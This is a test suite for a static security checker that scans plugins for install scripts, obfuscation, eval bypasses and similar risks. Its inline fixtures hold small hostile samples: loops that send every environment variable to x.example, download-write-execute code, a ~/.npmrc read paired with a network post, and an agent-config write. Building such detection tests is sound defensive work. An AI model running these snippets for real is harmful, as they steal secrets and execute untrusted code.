import { chmodSync, cpSync, existsSync, readFileSync, mkdirSync, mkdtempSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { KNOWN_VENDORED_SHA256 } from "../src/checks/files.js";
import { formatReport, runChecks, type CheckResult, type Finding } from "../src/checks/index.js";

const FIXTURES = new URL("./fixtures/", import.meta.url).pathname;
const scratch = realpathSync(mkdtempSync(join(tmpdir(), "sbb-checks-")));
afterAll(() => rmSync(scratch, { recursive: true, force: true }));

function normalise(dir: string): void {
  for (const e of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, e.name);
    if (e.isDirectory()) {
      chmodSync(p, 0o755);
      normalise(p);
    } else if (e.isFile()) chmodSync(p, 0o644);
  }
}
let n = 0;
/** Copies a fixture to scratch with sane modes (git does not keep group bits; the umask may differ). */
async function fixture(name: string): Promise<CheckResult> {
  const dir = join(scratch, `f${n++}-${name}`);
  cpSync(join(FIXTURES, name), dir, { recursive: true });
  chmodSync(dir, 0o755);
  normalise(dir);
  return runChecks(dir);
}
/** Builds a tree from literal files. */
async function tree(files: Record<string, string | Buffer>, after?: (dir: string) => void): Promise<CheckResult> {
  const dir = join(scratch, `t${n++}`);
  mkdirSync(dir, { mode: 0o755 });
  for (const [rel, body] of Object.entries(files)) {
    const full = join(dir, rel);
    mkdirSync(join(full, ".."), { recursive: true, mode: 0o755 });
    writeFileSync(full, body, { mode: 0o644 });
  }
  after?.(dir);
  return runChecks(dir);
}

const rules = (r: CheckResult, severity?: Finding["severity"]): string[] => r.findings.filter((f) => !severity || f.severity === severity).map((f) => f.rule);
const cap = (r: CheckResult, kind: string) => r.capabilities.find((c) => c.kind === kind);

describe("structure (spec §5.1)", () => {
  it("a clean TypeScript plugin has no findings and no capabilities", async () => {
    const r = await fixture("safe");
    expect(r.findings).toEqual([]);
    expect(r.capabilities).toEqual([]);
  });
  it("blocks install scripts (with the line)", async () => {
    const r = await fixture("install-script");
    const f = r.findings.find((x) => x.rule === "install-script")!;
    expect(f.severity).toBe("block");
    expect(f.file).toBe("package.json");
    expect(f.line).toBeGreaterThan(0);
  });
  it("blocks git/URL dependencies but not semver ranges", async () => {
    const r = await fixture("url-dependency");
    const hits = r.findings.filter((f) => f.rule === "url-dependency");
    expect(hits.map((h) => h.excerpt).join("\n")).toMatch(/a@github:evil\/a/);
    expect(hits.map((h) => h.excerpt).join("\n")).toMatch(/b@https/);
    expect(hits.some((h) => h.excerpt.includes("c@"))).toBe(false);
  });
  it("blocks .npmrc", async () => expect(rules(await fixture("npmrc"), "block")).toContain("npmrc"));
  // Built on the fly: the repository's .gitignore excludes .claude/, so a fixture could not be committed.
  it("blocks agent/IDE configs", async () => {
    const r = await tree({ ".claude/settings.json": "{}\n", ".cursor/rules": "x\n", "index.js": "export {};\n" });
    expect(r.findings.filter((f) => f.rule === "agent-config").map((f) => f.file).sort()).toEqual([".claude", ".cursor"]);
  });
  it("blocks .vscode, .codex, CLAUDE.md and AGENTS.md; GitHub CI is only information", async () => {
    const r = await tree({ ".github/workflows/ci.yml": "on: push\n", ".vscode/tasks.json": "{}\n", ".codex/config.toml": "x\n", "CLAUDE.md": "x\n", "AGENTS.md": "x\n", "index.js": "export {};\n" });
    expect(r.findings.filter((f) => f.rule === "agent-config" && f.severity === "block").map((f) => f.file).sort()).toEqual([".codex", ".vscode", "AGENTS.md", "CLAUDE.md"]);
    expect(r.findings.find((f) => f.file === ".github/workflows")).toMatchObject({ rule: "ci-config", severity: "info" });
  });
  it("blocks minified source", async () => expect(rules(await fixture("minified"), "block")).toContain("minified"));
  it("blocks obfuscated identifiers", async () => {
    const body = Array.from({ length: 12 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)} = ${i};`).join("\n") + "\n" + "// padding\n".repeat(40);
    expect(rules(await tree({ "index.js": body }), "block")).toContain("minified");
  });
  it("does not call ordinary readable code minified", async () => {
    const body = Array.from({ length: 80 }, (_, i) => `export function handler${i}(request, response) {\n  return response.send(request.body);\n}\n`).join("");
    expect(rules(await tree({ "index.js": body }))).not.toContain("minified");
  });
  it("blocks native modules, wasm and executables by magic bytes", async () => {
    const r = await tree({
      "addon.node": Buffer.from("\x7fELF....", "binary"),
      "x.wasm": Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]),
      "tool": Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 0, 0, 0, 0]),
      "data.bin2": Buffer.from([1, 2, 0, 3]),
      "ok.png": Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0]),
    });
    const bin = r.findings.filter((f) => f.rule === "binary").map((f) => f.file).sort();
    expect(bin).toEqual(["addon.node", "data.bin2", "tool", "x.wasm"]);
  });
  it("lets bb's own dist/ carry wasm and minified code, but still parses it", async () => {
    const r = await tree({ "dist/server.js": "export default function(a){return process.env.X}\n" + "x".repeat(0), "dist/engine.wasm": Buffer.from([0, 0x61, 0x73, 0x6d]) });
    expect(rules(r)).not.toContain("binary");
    expect(cap(r, "env")?.detail).toEqual(["X"]);
  });
  it("blocks a tree writable by group/others", async () => {
    const r = await tree({ "index.js": "export {};\n" }, (dir) => chmodSync(join(dir, "index.js"), 0o664));
    expect(rules(r, "block")).toContain("writable-by-others");
  });
  it("does not flag a tree only the owner can write", async () => expect(rules(await tree({ "index.js": "export {};\n" }))).not.toContain("writable-by-others"));
  it("blocks symlinks that leave the tree", async () => {
    const r = await tree({ "index.js": "export {};\n" }, (dir) => symlinkSync("/etc/passwd", join(dir, "link")));
    expect(rules(r, "block")).toContain("escaping-symlink");
  });
  it("looks inside node_modules and dist", async () => {
    const r = await tree({
      "node_modules/dep/package.json": JSON.stringify({ name: "dep", scripts: { postinstall: "node x" } }, null, 2),
      "node_modules/dep/index.js": "module.exports = require('node:child_process');\n",
      "dist/server.js": "import net from 'node:net';\nimport 'dep';\nexport default net;\n",
    });
    expect(r.findings.some((f) => f.rule === "install-script" && f.file.startsWith("node_modules/dep"))).toBe(true);
    expect(cap(r, "child_process")?.sites[0]!.file).toBe("node_modules/dep/index.js");
    expect(cap(r, "network")?.sites[0]!.file).toBe("dist/server.js");
  });
});

describe("invisible characters", () => {
  it("blocks an invisible character inside an identifier", async () => {
    const r = await fixture("invisible-identifier");
    const f = r.findings.find((x) => x.rule === "invisible-chars")!;
    expect(f.severity).toBe("block");
    expect(f.line).toBe(1);
    expect(f.excerpt).toContain("\\u{200B}");
  });
  it("blocks bidi controls inside a string", async () => {
    const r = await fixture("bidi-string");
    expect(r.findings.find((x) => x.rule === "invisible-chars")?.excerpt).toContain("\\u{202E}");
  });
  it.each([
    ["variation selector", "️"],
    ["tag/variation supplement", "\u{E0101}"],
    ["zero width joiner", "‍"],
    ["control", "\u0007"],
    ["line separator", " "],
  ])("blocks %s in a markdown file", async (_n, ch) => {
    expect(rules(await tree({ "README.md": `hello ${ch} world\n`, "index.js": "export {};\n" }), "block")).toContain("invisible-chars");
  });
  it("allows tabs, CRLF and a leading BOM", async () => {
    expect(rules(await tree({ "index.js": "﻿export const a = 1;\r\n\tconst b = 2;\r\n" }))).not.toContain("invisible-chars");
  });
});

describe("capabilities by AST", () => {
  it("lists every surface of a plugin", async () => {
    const r = await fixture("capabilities-all");
    const kinds = r.capabilities.map((c) => c.kind);
    expect(kinds).toEqual(["network", "env", "fs", "ui", "http_routes", "host_artifact", "builtin_rpc", "server_access"]);
    expect(cap(r, "network")!.detail).toEqual(expect.arrayContaining(["https", "fetch", "host:api.example.com"]));
    expect(cap(r, "env")!.detail).toEqual(["API_KEY"]);
    expect(cap(r, "http_routes")!.detail).toEqual(["POST /hook (auth: none)"]);
    expect(cap(r, "builtin_rpc")!.detail).toEqual(["bb-account"]);
    expect(cap(r, "ui")!.detail[0]).toContain("bb.app");
  });
  it("names the env variables, destructured or read directly", async () => {
    expect(cap(await fixture("env-names"), "env")!.detail).toEqual(["HOME", "TOKEN", "USER"]);
  });
  it("lists contributeEnv names", async () => {
    const r = await fixture("contribute-env-ok");
    expect(cap(r, "contribute_env")!.detail).toEqual(["MY_FLAG"]);
    expect(rules(r, "block")).toEqual([]);
  });
  it("sees network by fetch/WebSocket/XMLHttpRequest globals and node:http(s)/net/tls/dgram", async () => {
    const r = await tree({
      "a.js": "fetch('https://a.example/x'); new WebSocket('wss://b.example/ws'); new XMLHttpRequest();\n",
      "b.js": "import tls from 'node:tls';\nimport dgram from 'dgram';\nconst net = require('net');\nexport {tls, dgram, net};\n",
    });
    expect(cap(r, "network")!.detail).toEqual(expect.arrayContaining(["fetch", "WebSocket", "XMLHttpRequest", "tls", "dgram", "net", "host:a.example", "host:b.example"]));
  });
  it("parses JSX and TSX-free TypeScript, with the right line numbers", async () => {
    const r = await tree({ "x.ts": "const a: number = 1;\nconst b: string = 'x';\nfetch('/y');\n", "v.jsx": "export const V = () => <b onClick={() => eval('1')}>x</b>;\n" });
    expect(cap(r, "network")!.sites).toEqual([{ file: "x.ts", line: 3 }]);
    expect(cap(r, "dynamic_code")!.sites[0]).toEqual({ file: "v.jsx", line: 1 });
  });
});

describe("bypasses: each is a finding, a capability or an explicit 'dynamic access' review", () => {
  it('globalThis["ev"+"al"]', async () => expect(cap(await fixture("global-eval-concat"), "dynamic_code")!.detail).toContain("eval"));
  it('require("child_" + "process")', async () => expect(cap(await fixture("require-concat"), "child_process")).toBeDefined());
  it('process["env"]', async () => expect(cap(await fixture("process-env-computed"), "env")!.detail).toEqual(["TOKEN"]));
  it('const {exec} = await import("node:child_process")', async () => expect(cap(await fixture("dynamic-import-cp"), "child_process")).toBeDefined());
  it("new Function", async () => expect(cap(await fixture("new-function"), "dynamic_code")!.detail).toContain("new Function"));
  it("atob → eval is a block", async () => {
    const r = await fixture("decode-eval");
    expect(r.findings.find((f) => f.rule === "decode-eval")).toMatchObject({ severity: "block", file: "index.js", line: 2 });
  });
  it('atob → globalThis["ev"+"al"] through a variable is a block', async () => expect(rules(await fixture("decode-eval-bypass"), "block")).toContain("decode-eval"));
  it("Buffer.from(base64) → new Function is a block", async () => {
    const r = await tree({ "i.js": "const c = Buffer.from('YWxlcnQoMSk=', 'base64').toString();\nnew Function(c)();\n" });
    expect(rules(r, "block")).toContain("decode-eval");
  });
  it("(0, eval)(String.fromCharCode(...x)) is a block", async () => {
    const r = await tree({ "i.js": "export const f = (x) => (0, eval)(String.fromCharCode(...x));\n" });
    expect(rules(r, "block")).toContain("decode-eval");
  });
  it("a non-constant property of a global object is a 'dynamic access' review", async () => {
    const r = await fixture("dynamic-access");
    expect(r.findings.find((f) => f.rule === "dynamic-access")).toMatchObject({ severity: "review", line: 1 });
  });
  it("require(expression) / import(expression) is a review", async () => {
    expect(rules(await fixture("dynamic-require"), "review")).toContain("dynamic-require");
    const r = await tree({ "i.js": "export const l = (n) => import(n);\n" });
    expect(rules(r, "review")).toContain("dynamic-import");
  });
  it("aliasing require is a review", async () => expect(rules(await fixture("require-alias"), "review")).toContain("require-alias"));
  it("process[name] is a review and counts as reading the whole env", async () => {
    const r = await tree({ "i.js": "export const g = (k) => process[k];\n" });
    expect(rules(r, "review")).toContain("dynamic-access");
    expect(cap(r, "env")!.detail).toEqual(["*"]);
  });
  it("(function(){}).constructor('…') is a review", async () => {
    const r = await tree({ "i.js": "export const f = (function () {}).constructor('return 1');\n" });
    expect(rules(r, "review")).toContain("dynamic-constructor");
  });
  it("a URL import is a block", async () => expect(rules(await fixture("url-import"), "block")).toContain("url-import"));
  it("a file that does not parse is a review, not a pass", async () => {
    expect(await fixture("unparseable")).toMatchObject({ findings: [{ rule: "parse-failed", severity: "review", file: "index.js" }] });
  });
  it("a constant folded through variables is still seen", async () => {
    const r = await tree({ "i.js": "const a = 'child_';\nconst b = a + 'process';\nconst cp = require(b);\nexport default cp;\n" });
    expect(cap(r, "child_process")).toBeDefined();
  });
});

describe("hard signs (spec §5.1)", () => {
  it("serialising the whole environment", async () => {
    const r = await fixture("env-dump");
    expect(r.findings.find((f) => f.rule === "env-dump")).toMatchObject({ severity: "block", line: 1 });
    expect(rules(await tree({ "i.js": "export const s = JSON.stringify({ ...process.env, a: 1 });\n" }), "block")).toContain("env-dump");
    expect(rules(await tree({ "i.js": "export const s = JSON.stringify(Object.entries(process.env));\n" }), "block")).toContain("env-dump");
  });
  it("passing env to a child process is a capability, not a leak (round 2, item 12)", async () => {
    for (const name of ["env-spawn", "env-exec-alias", "env-fork-copy", "env-entries-spawn"]) {
      const r = await fixture(name);
      expect(rules(r, "block"), name).toEqual([]);
      expect(cap(r, "child_process"), name).toBeDefined();
      expect(cap(r, "env")!.detail, name).toContain("*");
    }
  });
  it.each(["env-fetch-body", "env-entries-map-fetch", "env-file", "env-template", "env-route-return", "env-rpc-return"])("a copy of the whole env that reaches the network, a file, a template or a handler's response: %s", async (name) => {
    expect(rules(await fixture(name), "block")).toContain("env-dump");
  });
  it("a copy kept in a variable and never sent anywhere is only a capability", async () => {
    const r = await tree({ "i.js": "export const copy = { ...process.env };\nexport const n = Object.keys(process.env).length;\n" });
    expect(rules(r, "block")).toEqual([]);
    expect(cap(r, "env")!.detail).toEqual(["*"]);
  });
  it("reading ~/.ssh with network is a block; without network a review", async () => {
    expect(rules(await fixture("secret-network"), "block")).toContain("secret-read-network");
    const r = await fixture("secret-no-network");
    expect(rules(r, "block")).toEqual([]);
    expect(rules(r, "review")).toContain("secret-path");
  });
  it("secret in one file and network in another is still a block", async () => {
    const r = await tree({ "a.js": "import { readFileSync } from 'node:fs';\nexport const p = readFileSync(process.env.HOME + '/.npmrc');\n", "b.js": "export const send = (d) => fetch('https://x.example', { method: 'POST', body: d });\n" });
    expect(rules(r, "block")).toContain("secret-read-network");
  });
  it("download and execute", async () => {
    expect(rules(await fixture("download-exec"), "block")).toContain("download-exec");
    expect(rules(await fixture("download-exec-pipe"), "block")).toContain("download-exec");
    const r = await tree({ "i.js": "import { writeFileSync, chmodSync } from 'node:fs';\nimport { execFileSync } from 'node:child_process';\nconst b = await (await fetch('https://x.example/b')).arrayBuffer();\nwriteFileSync('/tmp/b', Buffer.from(b));\nchmodSync('/tmp/b', 0o755);\nexecFileSync('/tmp/b');\n" });
    expect(rules(r, "block")).toContain("download-exec");
  });
  it("writing rc files and agent configs", async () => {
    expect(rules(await fixture("rc-write"), "block")).toContain("rc-or-agent-config-write");
    const r = await tree({ "i.js": "import { writeFileSync } from 'node:fs';\nwriteFileSync('/Users/me/.claude/settings.json', '{}');\n" });
    expect(rules(r, "block")).toContain("rc-or-agent-config-write");
  });
  it("mentioning .zshrc without any way to write is not a block", async () => {
    expect(rules(await tree({ "i.js": "export const help = 'add this to ~/.zshrc';\n" }), "block")).toEqual([]);
  });
  it.each(["NODE_OPTIONS", "DYLD_INSERT_LIBRARIES", "LD_PRELOAD", "GIT_SSH_COMMAND", "PATH", "HTTPS_PROXY", "http_proxy"])("contributeEnv on %s is a block", async (name) => {
    const r = await tree({ "i.js": `export default (bb) => bb.experimental_contributeEnv('p', () => [{ name: '${name}', value: 'x' }]);\n` });
    expect(rules(r, "block")).toContain("contribute-env-dangerous");
  });
  it("contributeEnv NODE_OPTIONS from the fixture, with the name listed", async () => {
    const r = await fixture("contribute-env-bad");
    expect(cap(r, "contribute_env")!.detail).toEqual(["NODE_OPTIONS"]);
  });
});

describe("result shape", () => {
  it("is deterministic, most severe first, and reports a text form", async () => {
    const a = await fixture("secret-network");
    const b = await fixture("secret-network");
    expect({ ...a, stats: null }).toEqual({ ...b, stats: null });
    const mixed = await tree({ "package.json": JSON.stringify({ name: "m", scripts: { install: "x" } }, null, 2), "i.js": "export const l = (n) => require(n);\n" });
    expect(mixed.findings.map((f) => f.severity)).toEqual(["block", "review"]);
    expect(formatReport(mixed)).toMatch(/\[block\] install-script/);
    expect(formatReport(await fixture("safe"))).toContain("capabilities: none");
  });
  it("finishes in seconds on a big tree", async () => {
    const files: Record<string, string> = {};
    for (let i = 0; i < 400; i++) files[`node_modules/p${i}/index.js`] = Array.from({ length: 20 }, (_, j) => `export function f${i}_${j}(a) { return a + ${j}; }\n`).join("");
    const t0 = Date.now();
    const r = await tree(files);
    expect(Date.now() - t0).toBeLessThan(5000);
    expect(r.findings.slice(0, 2)).toEqual([]);
    expect(r.stats.parsed).toBe(400);
  });
  it("the checked directory is not modified", async () => {
    const dir = join(scratch, "ro");
    cpSync(join(FIXTURES, "safe"), dir, { recursive: true });
    normalise(dir);
    const before = statSync(join(dir, "server.ts")).mtimeMs;
    await runChecks(dir);
    expect(statSync(join(dir, "server.ts")).mtimeMs).toBe(before);
  });
});

describe("review 2.1 — what used to be silent", () => {
  const capDetail = (r: CheckResult, kind: string) => cap(r, kind)?.detail ?? [];
  it("process.getBuiltinModule('child_process') is a capability; a computed name is a review", async () => {
    expect(cap(await fixture("get-builtin-module"), "child_process")).toBeDefined();
    expect(rules(await fixture("get-builtin-module-dynamic"), "review")).toContain("dynamic-require");
  });
  it("module.constructor._load and Module._load are a review and a capability", async () => {
    for (const name of ["module-load", "module-load-import"]) {
      const r = await fixture(name);
      expect(rules(r, "review")).toContain("module-load");
      expect(cap(r, "child_process")).toBeDefined();
    }
    expect(rules(await fixture("module-load"), "review")).toContain("dynamic-constructor");
  });
  it("(() => {}).constructor('…')() is a review and dynamic code", async () => {
    const r = await fixture("arrow-constructor");
    expect(rules(r, "review")).toContain("dynamic-constructor");
    expect(cap(r, "dynamic_code")).toBeDefined();
  });
  it("a bare read of .constructor is dynamic code and a review (round 2, item 11) — except new on a class/array literal", async () => {
    const r = await tree({ "i.js": "export const n = (o) => o.constructor;\n" });
    expect(rules(r, "review")).toContain("dynamic-constructor");
    expect(cap(r, "dynamic_code")).toBeDefined();
    const ok = await fixture("constructor-new-literal");
    expect(rules(ok)).not.toContain("dynamic-constructor");
    expect(ok.capabilities).toEqual([]);
  });
  it.each(["constructor-var", "constructor-async", "constructor-generator", "constructor-async-generator", "constructor-destructured", "constructor-computed"])("%s is dynamic code and a review", async (name) => {
    const r = await fixture(name);
    expect(rules(r, "review"), name).toContain("dynamic-constructor");
    expect(cap(r, "dynamic_code"), name).toBeDefined();
  });
  it.each(["proxy-global", "proxy-alias", "proxy-process"])("new Proxy(globalThis|process) is a review: %s", async (name) => {
    const r = await fixture(name);
    expect(rules(r, "review")).toContain("global-proxy");
    expect(cap(r, "dynamic_code")!.detail.join()).toContain("Proxy");
  });
  it("g.eval(…) through a proxy is an eval", async () => expect(cap(await fixture("proxy-global"), "dynamic_code")!.detail).toContain("eval"));
  it("a Proxy over an ordinary object is nothing", async () => expect((await fixture("proxy-plain")).capabilities).toEqual([]));
  it("setTimeout/setInterval with a string execute code", async () => {
    for (const name of ["settimeout-string", "setinterval-string"]) {
      const r = await fixture(name);
      expect(capDetail(r, "dynamic_code").join()).toMatch(/set(Timeout|Interval)\(string\)/);
    }
    expect(cap(await tree({ "i.js": "setTimeout(() => 1, 5);\n" }), "dynamic_code")).toBeUndefined();
  });
  it("WebAssembly is dynamic code and a review", async () => {
    const r = await fixture("webassembly");
    expect(cap(r, "dynamic_code")!.detail).toContain("WebAssembly");
    expect(rules(r, "review")).toContain("webassembly");
  });
  it("node:inspector is dynamic code", async () => expect(capDetail(await fixture("inspector"), "dynamic_code")).toContain("inspector"));
  it("an unknown node: module is a review, a known harmless one is not", async () => {
    expect(rules(await fixture("unknown-builtin"), "review")).toContain("unknown-builtin");
    expect(rules(await tree({ "i.js": "import p from 'node:path';\nimport u from 'node:util';\nexport default [p, u];\n" }))).toEqual([]);
  });
  it("cp[name](…) on a module namespace is a review", async () => {
    const r = await fixture("computed-module-call");
    expect(rules(r, "review")).toContain("dynamic-access");
    expect(cap(r, "child_process")).toBeDefined();
  });
  it("Reflect.get(globalThis, k) is a review", async () => expect(rules(await fixture("reflect-global"), "review")).toContain("dynamic-access"));

  describe("env-dump, every form (item 2)", () => {
    it.each(["env-spread", "env-assign", "env-structured-clone", "env-alias-stringify", "env-copy-alias-stringify", "env-rest"])("%s", async (name) => {
      expect(rules(await fixture(name), "block")).toContain("env-dump");
    });
    it("named reads through an alias are not a dump and keep their names", async () => {
      const r = await fixture("env-named-only");
      expect(rules(r, "block")).toEqual([]);
      expect(capDetail(r, "env")).toEqual(["HOME", "SHELL", "USER"]);
    });
  });

  describe("parsing TypeScript (item 3, 4)", () => {
    it("parses enum, namespace, constructor parameter properties and generics — with true line numbers", async () => {
      const r = await fixture("ts-everything");
      expect(rules(r)).not.toContain("parse-failed");
      expect(cap(r, "network")!.sites[0]).toEqual({ file: "index.ts", line: 12 });
    });
    it("parses .tsx with imports, enums, generic arrows and JSX; sees the fetch inside JSX", async () => {
      const r = await fixture("tsx-everything");
      expect(rules(r)).not.toContain("parse-failed");
      expect(cap(r, "network")!.sites[0]).toEqual({ file: "view.tsx", line: 6 });
    });
    it("an ES module that fails to parse reports the module-mode error, not a 'sourceType' complaint", async () => {
      const r = await tree({ "v.tsx": "import x from 'y';\nexport const a = ;\n" });
      const f = r.findings.find((x) => x.rule === "parse-failed")!;
      expect(f.severity).toBe("review");
      expect(f.excerpt).not.toMatch(/sourceType/);
    });
    it("a .cjs file is a script", async () => expect(cap(await tree({ "a.cjs": "const cp = require('child_process');\nreturn cp;\n" }), "child_process")).toBeDefined());
  });

  describe("path strings (item 5)", () => {
    it("bare strings are only info, even with network and a writer in the plugin", async () => {
      const r = await fixture("bare-strings");
      expect(rules(r, "block")).toEqual([]);
      expect(rules(r, "review")).toEqual([]);
      expect(rules(r, "info")).toEqual(expect.arrayContaining(["secret-path-string"]));
    });
    it.each(["secret-join-network", "secret-template-network", "secret-variable-network"])("%s: a secret path that reaches fs/path/os plus network is a block", async (name) => {
      expect(rules(await fixture(name), "block")).toContain("secret-read-network");
    });
    it("a config path that is only read or joined is not a write", async () => {
      const r = await fixture("rc-read-only");
      expect(rules(r, "block")).toEqual([]);
    });
    it("a shell pipe is a block only where it reaches child_process", async () => {
      expect(rules(await fixture("bare-strings"), "block")).toEqual([]);
      expect(rules(await fixture("download-exec-pipe"), "block")).toContain("download-exec");
    });
  });

  describe("minified (items 6, 9)", () => {
    it("the vendored parser files are not called minified, and are not special-cased by path", async () => {
      for (const f of ["acorn.mjs", "acorn-jsx.mjs", "acorn-typescript.mjs"]) {
        const r = await tree({ "vendored.mjs": readFileSync(new URL(`../guard/vendor/${f}`, import.meta.url)) });
        expect(rules(r), f).not.toContain("minified");
      }
    });
    it("the exemption is by hash: the same file with one byte changed is judged on its merits", async () => {
      const text = readFileSync(new URL("../guard/vendor/acorn.mjs", import.meta.url), "utf8");
      expect(rules(await tree({ "v.mjs": text + "\n// x\n" }))).not.toContain("minified"); // still readable code: no exemption needed
      expect(KNOWN_VENDORED_SHA256.size).toBe(3);
    });
    it("every built-in hash is the one written in vendor/README.md", () => {
      const readme = readFileSync(new URL("../guard/vendor/README.md", import.meta.url), "utf8");
      for (const h of KNOWN_VENDORED_SHA256) expect(readme).toContain(h);
    });
    it("a few \\u escapes in a big file do not make it dense", async () => {
      const body = "export const A = '\\u00e9\\u00e8';\n".repeat(10) + Array.from({ length: 300 }, (_, i) => `export function handler${i}(request) {\n  return request.value + ${i};\n}\n`).join("");
      expect(rules(await tree({ "i.js": body }))).not.toContain("minified");
    });
    it("real dense escapes still are", async () => {
      const body = "const t = '" + "\\u00e9".repeat(500) + "';\n" + "// pad\n".repeat(20);
      expect(rules(await tree({ "i.js": body }), "block")).toContain("minified");
    });
    it("a long line that is a template-literal script is data, not minified code (inline-vis/frame.ts)", async () => {
      expect(rules(await fixture("template-script"))).not.toContain("minified");
    });
    it("but a minified payload in plain code still is", async () => expect(rules(await fixture("minified"), "block")).toContain("minified"));
  });

  describe("secure-bb checks itself (item 7)", () => {
    it("the tree of secure-bb (without test/) has no block finding", async () => {
      const dir = join(scratch, "self");
      const repo = new URL("..", import.meta.url).pathname;
      cpSync(repo, dir, { recursive: true, filter: (p) => !/\/(node_modules|\.git|dist|test|\.claude|chk|\.home)(\/|$)/.test(p.slice(repo.length - 1)) && !/package-lock\.json$/.test(p) });
      chmodSync(dir, 0o755);
      normalise(dir);
      const r = await runChecks(dir);
      expect(r.findings.filter((f) => f.severity === "block"), formatReport(r)).toEqual([]);
      expect(r.stats.parsed).toBeGreaterThan(10);
      expect(rules(r)).not.toContain("parse-failed");
    });
  });

  describe("dependencies (item 8) and secrets with network (item 10)", () => {
    it("workspace: and git+https: are a review", async () => {
      const r = await fixture("workspace-dep");
      expect(r.findings.find((f) => f.rule === "workspace-dependency")!.severity).toBe("review");
      expect(r.findings.find((f) => f.rule === "url-dependency")!.severity).toBe("review");
    });
    it("a secret-looking env variable next to dns is a review", async () => {
      const r = await fixture("dns-secret");
      expect(cap(r, "network")!.detail).toContain("dns/promises");
      expect(r.findings.find((f) => f.rule === "env-secret-network")).toMatchObject({ severity: "review", file: "index.js" });
    });
    it("a harmless env variable next to dns is not", async () => expect(rules(await fixture("dns-no-secret"))).not.toContain("env-secret-network"));
  });
});

describe("bb's own plugins (round 2, item 13)", () => {
  const automations = "/opt/bb/app/plugins/automations";
  it.skipIf(!existsSync(automations))("the built-in automations plugin has no block finding", async () => {
    const dir = join(scratch, "automations");
    cpSync(automations, dir, { recursive: true, filter: (p) => !/\/(\.bundled-runtime|node_modules|dist|\.git)(\/|$)/.test(p.slice(automations.length)) });
    chmodSync(dir, 0o755);
    normalise(dir);
    const r = await runChecks(dir);
    expect(r.findings.filter((f) => f.severity === "block"), formatReport(r)).toEqual([]);
    expect(cap(r, "child_process")).toBeDefined(); // it spawns script runners with { env: { ...process.env } }
    expect(cap(r, "env")!.detail).toContain("*");
  });
});

describe("review 2.1, final notes (stage 2.2)", () => {
  const js = (body: string) => tree({ "index.js": body });
  it("enumerating the environment and sending it from the loop body is an env-dump", async () => {
    const r = await js("for (const [k, v] of Object.entries(process.env)) navigator.sendBeacon('https://x.example/', k + v);\n");
    expect(rules(r, "block")).toContain("env-dump");
  });
  it("the same through forEach / map callbacks", async () => {
    expect(rules(await js("Object.entries(process.env).forEach(([k, v]) => fetch('https://x.example/' + k + v));\n"), "block")).toContain("env-dump");
    expect(rules(await js("Object.keys(process.env).map((k) => fetch('https://x.example/' + k));\n"), "block")).toContain("env-dump");
  });
  it("enumerating the environment without sending it is only a capability", async () => {
    const r = await js("for (const k of Object.keys(process.env)) console.log(k);\n");
    expect(rules(r, "block")).toEqual([]);
    expect(cap(r, "env")).toBeDefined();
  });
  it("the whole environment passed to an unknown function is a review, not silence", async () => {
    const r = await js("import { foo } from './foo.js';\nfoo(process.env);\n");
    expect(rules(r, "review")).toContain("env-passed");
    expect(rules(r, "block")).toEqual([]);
  });
  it("spawn(…, { env: process.env }) and Object.keys(process.env) are not env-passed", async () => {
    const r = await js("import { spawn } from 'node:child_process';\nspawn('ls', [], { env: { ...process.env } });\nObject.keys(process.env);\n");
    expect(rules(r)).not.toContain("env-passed");
  });
  it(".constructor.name and comparisons are harmless; calling or passing the constructor is not", async () => {
    expect(rules(await js("const o = {};\nconsole.log(o.constructor.name, o.constructor === Object, typeof o.constructor);\n"))).not.toContain("dynamic-constructor");
    expect(rules(await js("const f = () => {};\nf.constructor('return process')();\n"), "review")).toContain("dynamic-constructor");
    expect(rules(await js("const F = (() => {}).constructor;\nF('return 1')();\n"), "review")).toContain("dynamic-constructor");
    expect(rules(await js("const f = () => {};\nf.constructor.call(null, 'return 1')();\n"), "review")).toContain("dynamic-constructor");
  });
});
